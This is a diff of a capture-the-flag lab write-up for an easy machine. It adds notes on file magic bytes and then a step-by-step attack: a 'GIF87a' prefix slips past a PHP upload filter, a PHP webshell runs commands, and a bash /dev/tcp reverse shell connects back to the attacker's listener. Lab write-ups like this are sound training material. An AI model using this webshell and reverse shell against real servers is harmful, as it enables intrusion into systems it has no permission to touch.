@@ -5,8 +5,10 @@ Info
 * Difficulty: easy
 * IP: `10.10.10.146`
 
-Vulnerabilities
+Tags
 * php
+* magic bytes
+* webshell
 
 <!--
 
@@ -17,6 +19,7 @@ Required tools
 Other commands/tools
 ```
 exiftool
+file
 ```
 
 -->
@@ -157,4 +160,94 @@ uploads/127_0_0_4.png
 uploads/127_0_0_3.png
 uploads/127_0_0_2.png
 uploads/127_0_0_1.png
+```
+
+Investigate magic bytes and file types
+
+* https://www.php.net/manual/en/function.finfo-file.php
+* https://en.wikipedia.org/wiki/List_of_file_signatures
+* https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance
+* https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198
+
+```bash
+# upload.php: check_file_type($_FILES["myFile"]
+# lib.php: @finfo_file / @mime_content_type
+# lib.php: if (strpos($mime_type, 'image/') === 0)
+# upload.php: $validext = array('.jpg', '.png', '.gif', '.jpeg');
+
+file -i random.jpg 
+#random.jpg: image/jpeg; charset=binary
+
+file random.jpg 
+#random.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=6, orientation=upper-left, xresolution=86, yresolution=94, resolutionunit=2], progressive, precision 8, 200x200, components 3
+
+xxd random.jpg | head
+#00000000: ffd8 ffe1 00de 4578 6966 0000 4949 2a00  ......Exif..II*.
+
+# example executable
+ELF Executable
+".ELF"
+0x7F 0x45 0x4C 0x46
+
+# craft ELF
+python3 -c 'print("\x7F\x45\x4C\x46")' > test-elf.txt
+# verify
+file test-elf.txt 
+#test-elf.txt: ELF
+xxd test-elf.txt 
+#00000000: 7f45 4c46 0a                             .ELF.
+
+# example image
+GIF Image
+"GIF87a"
+0x47 0x49 0x46 0x38 0x37 0x61
+
+# craft image
+echo -n -e 'GIF87a' > test-gif.txt
+# verify
+file test-gif.txt 
+#test-gif.txt: GIF image data, version 87a,
+xxd test-gif.txt 
+#00000000: 4749 4638 3761                           GIF87a
+```
+
+Circumvent file type protection and upload PHP webshell
+```bash
+echo -n -e 'GIF87a <?php print("Hello World"); ?>' > test.php.gif
+
+# verify
+file test.php.gif 
+#test.php.gif: GIF image data, version 87a, 15392 x 28735
+
+# upload
+http -f POST 10.10.10.146/upload.php submit='go!' myFile@test.php.gif
+
+# verify (name is ip address of request)
+curl -sS http://10.10.10.146/uploads/10_10_14_14.php.gif
+
+# webshell
+echo -n -e 'GIF87a <?php system($_GET['cmd']); ?>' > webshell.php.gif
+echo -n -e 'GIF87a <?php system($_REQUEST['cmd']); ?>' > webshell.php.gif
+
+# upload
+http -f POST 10.10.10.146/upload.php submit='go!' myFile@webshell.php.gif
+# list
+http http://10.10.10.146/photos.php | pup 'table td img attr{src}'
+# request
+http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=whoami
+# GIF87a apache
+http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=id
+# GIF87a uid=48(apache) gid=48(apache) groups=48(apache)
+
+# url encode payload
+jq --raw-output --null-input --arg VALUE "bash -i >& /dev/tcp/10.10.14.14/4242 0>&1" '$VALUE|@uri'
+#bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F4242%200%3E%261
+urlencode "bash -i >& /dev/tcp/10.10.14.14/4242 0>&1"
+#bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.14%2F4242+0%3E%261
+
+# listen
+nc -lvnp 4242
+# open reverse shell
+http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F4242%200%3E%261
+http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.14%2F4242+0%3E%261
 ```
